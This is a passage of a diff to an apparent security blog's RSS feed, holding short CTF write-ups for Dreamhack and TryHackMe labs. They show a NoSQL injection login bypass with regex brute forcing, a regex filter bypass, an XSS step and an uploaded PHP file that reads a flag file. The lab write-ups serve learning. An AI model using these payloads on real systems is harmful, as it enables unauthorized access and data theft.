+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117102926.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+after registration we are prompted that we need to wait for a moderator confirmation&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261117103548.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+i thought that i can modify a certain field using this syntax but it was not the case, ignore this.&lt;br&gt;
+we need to xss , create another account with this playload as the email value:&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Mango - Dreamhack</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/mango---dreamhack/</link>
+      <pubDate>Thu, 12 Nov 2026 11:52:40 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/mango---dreamhack/</guid>
+      
+      <description>&lt;p&gt;link: &lt;a href=&#34;https://dreamhack.io/wargame/challenges/90&#34;&gt;https://dreamhack.io/wargame/challenges/90&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;by the name of the challenge and the principle suggested to solve this room , we can deduce that we have to perform a NoSql injection:&lt;/p&gt;
+&lt;p&gt;we know what we can login as guest , with pass guest , which works.&lt;br&gt;
+we can modify the payload to &lt;code&gt;uid[$ne]=something&amp;amp;upw[$regex]=^D[Hh]\{&lt;/code&gt;&lt;br&gt;
+this basically means that we want all items that does not match uid=something and a upw of length of 32 (we know the password length from the description)&lt;br&gt;
+i used burp for this :&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261112135242.png&#34; alt=&#34;&#34;&gt;
+ and we have admin , this means that our presuption is true&lt;br&gt;
+now we can continue to bruteforce one by one character the upw , which takes kinda much&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261112140659.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+the next photo series present the workflow , go to intruder , find a new character , add it to the payload and decrement the multiplication factor of &lt;code&gt;.&lt;/code&gt; , but this will take forever&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261112140909.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261112140947.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261112141017.png&#34; alt=&#34;&#34;&gt;
+&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Jackpot</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot/</link>
+      <pubDate>Thu, 12 Nov 2026 11:35:18 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot/</guid>
+      
+      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
+Description:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
+
+The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Jackpot</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/</link>
+      <pubDate>Thu, 12 Nov 2026 10:47:54 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/</guid>
+      
+      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
+Description:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
+
+The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Jackpot</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-2/</link>
+      <pubDate>Thu, 12 Nov 2026 10:47:54 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-2/</guid>
+      
+      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
+Description:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
+
+The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Jackpot</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/jackpot/</link>
+      <pubDate>Thu, 12 Nov 2026 10:47:53 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/jackpot/</guid>
+      
+      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
+Description:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
+
+The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Dreamhack &gt; phpreg</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/dreamhack--phpreg/</link>
+      <pubDate>Thu, 12 Nov 2026 10:38:07 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/dreamhack--phpreg/</guid>
+      
+      <description>&lt;p&gt;link:https://dreamhack.io/wargame/challenges/873&lt;/p&gt;
+&lt;p&gt;access the page, u will be prompted to input a pass and username.&lt;br&gt;
+inspecting the step2.php we see the following :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REQUEST_METHOD&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $input_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input1&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input1&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $input_pw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input2&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input2&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// pw filtering
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/[a-zA-Z]/&amp;#34;&lt;/span&gt;, $input_pw)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alphabet in the pw :(&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              $name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/nyang/i&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, $input_name);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              $pw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/\d*\@\d{2,3}(31)+[^0-8&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]\!/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d4y0r50ng&amp;#34;&lt;/span&gt;, $input_pw);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($name &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dnyang0310&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $pw &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d4y0r50ng+1+13&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;h4&amp;gt;Step 2 : Almost done...&amp;lt;/h4&amp;gt;&amp;lt;div class=&amp;#34;door_box&amp;#34;&amp;gt;&amp;lt;div class=&amp;#34;door_black&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;#34;door&amp;#34;&amp;gt;&amp;lt;div class=&amp;#34;door_cir&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;basically what happens here is that our input in modifyed using regex so we have to bypass this.&lt;br&gt;
+our username has to be &lt;code&gt;dnnyangyang0310&lt;/code&gt; because the first &lt;code&gt;nyang&lt;/code&gt; will be removed, and the password has to be &lt;code&gt;@12319!+1+13&lt;/code&gt; because the &lt;code&gt;@12319!&lt;/code&gt; will be replaced with &lt;code&gt;d4y0r50ng&lt;/code&gt;&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Dreamhack &gt; image-storage</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/dreamhack--image-storage/</link>
+      <pubDate>Thu, 12 Nov 2026 10:00:35 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/dreamhack--image-storage/</guid>
+      
+      <description>&lt;p&gt;link :https://dreamhack.io/wargame/challenges/38&lt;/p&gt;
+&lt;p&gt;just upload a php file with the content :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/flag.txt&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;then access it via list page&lt;br&gt;
+in my first try i overcomplicated things using a php rev shell and it did not work probably because of some security filters.&lt;/p&gt;</description>
+      
+    </item>
+    
+    <item>
+      <title>Dreamhack &gt; ex-reg-ex</title>
+      <link>https://novaclearnscyber.github.io/blog/posts/dreamhack--ex-reg-ex/</link>
+      <pubDate>Thu, 12 Nov 2026 09:48:52 +0000</pubDate>
+      <guid>https://novaclearnscyber.github.io/blog/posts/dreamhack--ex-reg-ex/</guid>
+      
+      <description>&lt;p&gt;link : &lt;a href=&#34;https://dreamhack.io/wargame/challenges/834&#34;&gt;https://dreamhack.io/wargame/challenges/834&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;the webserver displayes the following :&lt;br&gt;
+&lt;img src=&#34;https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020261112115007.png&#34; alt=&#34;&#34;&gt;
+&lt;br&gt;
+at first i tried to obtain the flag using reg ex without looking at the app.py code with the following payload :&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-regex&#34; data-lang=&#34;regex&#34;&gt;SpongeBoB@DH\{[A-Za-z][A-Za-z][A-Za-z][A-Za-z][A-Za-z]\}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;it did not work , i thought that the flag should be displayed using a regex expression&lt;br&gt;
+then i inspected the app.py code , the interesting part is bellow :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    FLAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./flag.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    FLAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[**FLAG**]&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@app.route&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;, methods &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    input_val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;method &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        input_val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input_val&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+&amp;#39;&lt;/span&gt;, input_val)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; m:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; render_template(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index.html&amp;#34;&lt;/span&gt;, pre_txt&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;input_val, flag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;FLAG)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; render_template(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index.html&amp;#34;&lt;/span&gt;, pre_txt&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;input_val, flag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;the input has to match &lt;code&gt;&#39;dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+&#39;&lt;/code&gt; which translated from regex means:&lt;/p&gt;</description>
+      
+    </item>
+    
     <item>
       <title>Dreamhack - file-download-1</title>
       <link>https://novaclearnscyber.github.io/blog/posts/dreamhack---file-download-1/</link>
@@ -277,66 +595,6 @@ first scan :&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;interesting .git exposed , use git-dump to investigate it&lt;br&gt;
 to install git-dump use this &lt;a href=&#34;https://github.com/arthaud/git-dumper&#34;&gt;repo&lt;/a&gt;&lt;/p&gt;</description>
-      
-    </item>
-    
-    <item>
-      <title>Jackpot</title>
-      <link>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/</link>
-      <pubDate>Mon, 12 Oct 2026 08:09:49 +0000</pubDate>
-      <guid>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-1/</guid>
-      
-      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
-Description:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
-
-The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
-      
-    </item>
-    
-    <item>
-      <title>Jackpot</title>
-      <link>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-2/</link>
-      <pubDate>Mon, 12 Oct 2026 08:09:49 +0000</pubDate>
-      <guid>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot-2/</guid>
-      
-      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
-Description:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
-
-The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
-      
-    </item>
-    
-    <item>
-      <title>Jackpot</title>
-      <link>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot/</link>
-      <pubDate>Mon, 12 Oct 2026 08:03:16 +0000</pubDate>
-      <guid>https://novaclearnscyber.github.io/blog/posts/writeups/jackpot/</guid>
-      
-      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
-Description:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
-
-The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
-      
-    </item>
-    
-    <item>
-      <title>Jackpot</title>
-      <link>https://novaclearnscyber.github.io/blog/posts/jackpot/</link>
-      <pubDate>Sun, 11 Oct 2026 12:15:16 +0000</pubDate>
-      <guid>https://novaclearnscyber.github.io/blog/posts/jackpot/</guid>
-      
-      <description>&lt;p&gt;link:&lt;a href=&#34;https://tryhackme.com/room/jackpot&#34;&gt;https://tryhackme.com/room/jackpot&lt;/a&gt;&lt;br&gt;
-Description:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;A branch ATM at &amp;#34;Earth&amp;#39;s National Bank&amp;#34; has been pulled off the network for forensic review after a string of unexplained cash-outs. The maintenance interface it exposes was only ever meant for engineers on the branch LAN, but it was left reachable, and it speaks the machine&amp;#39;s native hardware language with no authentication worth the name.
-
-The cash dispenser doesn&amp;#39;t care about cards, PINs, or transactions. It only cares whether something fluent in its protocol is giving it orders. Evaluate the exposed terminal, learn how its software talks to the hardware, and see if you can convince it to empty every cassette.
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 ports opened on the first scan&lt;/p&gt;</description>
       
     </item>
     
